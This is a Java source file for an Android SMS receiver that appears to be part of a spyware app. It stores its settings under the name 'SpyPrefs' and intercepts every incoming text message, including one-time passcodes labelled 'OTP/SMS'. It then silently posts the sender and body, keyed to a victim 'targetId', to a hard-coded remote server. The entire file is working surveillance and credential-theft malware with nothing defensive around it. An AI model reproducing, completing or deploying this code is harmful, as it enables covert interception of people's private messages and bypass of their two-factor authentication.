package com.nullx.pp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SmsReceiver extends BroadcastReceiver {
    private static final String SERVER_BASE = "http://papi.queen-official.com:5021";
    private static final String TAG = "CRPT.SMS";

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            Bundle bundle = intent.getExtras();
            if (bundle == null) return;

            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null) return;

            String format = bundle.getString("format");

            for (Object pdu : pdus) {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu, format);
                String from = sms.getDisplayOriginatingAddress();
                String body = sms.getDisplayMessageBody();

                Log.d(TAG, "SMS from: " + from + " | body: " + body);

                SharedPreferences prefs = context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
                String targetId = prefs.getString("targetId", "UNKNOWN_ID");

                relaySms(targetId, from, body);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage());
        }
    }

    private void relaySms(String targetId, String from, String body) {
        new Thread(() -> {
            HttpURLConnection conn = null;
            OutputStream os = null;
            try {
                URL url = new URL(SERVER_BASE + "/api/post-notification/" + targetId);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.setDoOutput(true);

                JSONObject json = new JSONObject();
                json.put("title",    "[SMS] " + from);
                json.put("body",     body);
                json.put("package",  "sms");
                json.put("category", "OTP/SMS");

                // ✅ FIX: Ambil byte array dengan benar
                byte[] data = json.toString().getBytes("UTF-8");
                os = conn.getOutputStream();
                os.write(data);
                os.flush();

            } catch (Exception e) {
                Log.e(TAG, "SMS relay failed: " + e.getMessage());
            } finally {
                try { if (os != null) os.close(); } catch (Exception ignored) {}
                try { if (conn != null) conn.disconnect(); } catch (Exception ignored) {}
            }
        }).start();
    }
}